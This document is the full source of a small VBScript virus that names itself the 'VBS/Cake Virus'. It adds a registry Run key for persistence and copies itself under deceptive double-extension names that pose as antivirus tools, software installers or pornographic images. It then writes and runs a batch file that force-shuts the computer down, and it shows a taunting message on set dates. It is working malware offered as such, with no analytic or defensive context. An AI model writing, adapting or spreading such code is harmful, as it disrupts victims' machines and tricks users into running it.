' VB Script Document

Set shell=CreateObject("Wscript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")
Set windir=fso.GetSpecialFolder(0)
Set tempdir=fso.GetSpecialFolder(2)


sub regcreate(regkey,regvalue)
Rem Enable Registry Writing
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub
function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function

regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\EmailName","Cake@yahoo.com"
regcreate "HKEY_CURRENT_USER\Software\America Online\AOL Instant Messenger (TM)\CurrentVersion\Login\Screen Name","Cake"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner\Cake","Cake"
regcreate "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Cake","Cake.vbs"


fso.copyfile wscript.scriptfullname, "C:\" & Newname

function newname()
randomize timer
l = int(rnd * 16)+1
if l = 1 then newname = "Anitvirus.exe.vbs"
if l = 2 then newname = "FireFox.exe.vbs"
if l = 3 then newname = "Pussy.jpg.vbs"
if l = 4 then newname = "Orgasm.jpg.vbs"
if l = 5 then newname = "Prono.jpg.vbs"
if l = 6 then newname = "Naked.jpg.vbs"
if l = 7 then newname = "Nude.jpg.vbs"
if l = 8 then newname = "Hot.jpg.vbs"
if l = 9 then newname = "Tits.jpg.vbs"
if l = 10 then newname = "Norton.exe.vbs"
if l = 11 then newname = "Mcafee.exe.vbs"
if l = 12 then newname = "Adobe.exe.vbs"
if l = 13 then newname = "Windows.exe.vbs"
if l = 14 then newname = "Macromedia.exe.vbs"
if l = 15 then newname = "Porn.jpg.vbs"
if l = 16 then newname = "Girls.jpg.vbs"
end function


wscript.sleep 10000



Set wrte=fso.CreateTextFile(windir+"\Cake.cmd")
wrte.WriteLine "cls"
wrte.WriteLine "@echo off"
wrte.WriteLine "shutdown -s -f -t 60 -c "+chr(34)+"You Have The VBS/Cake Virus Wrote By Kat Eyes"+chr(34)
wrte.Close()

shell.Run windir+"\Cake.cmd"

If Day(Now()) = 5 or Day(Now()) = 19 or Day(Now()) = 28 Then
msgbox "Hello You Have The VBS/Cake Virus By Kat Eyes", vbInformation, "eRROR"
End If